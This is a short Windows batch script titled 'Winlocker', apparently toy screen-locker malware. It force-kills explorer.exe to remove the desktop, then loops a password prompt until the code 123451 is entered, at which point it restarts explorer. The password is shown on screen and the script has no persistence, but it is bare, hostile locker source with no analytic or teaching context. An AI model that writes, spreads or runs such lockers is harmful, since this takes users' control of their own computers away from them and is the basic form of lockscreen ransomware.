@echo off
taskkill /im explorer.exe /f >nul
Title Winlocker
color 0c

echo Winlocker pass 123451
echo Enter pass:

:h
set /p x=
if %x%==123451 (echo win start
start explorer
exit
) else (
echo Error!
echo Winlock off
)
goto h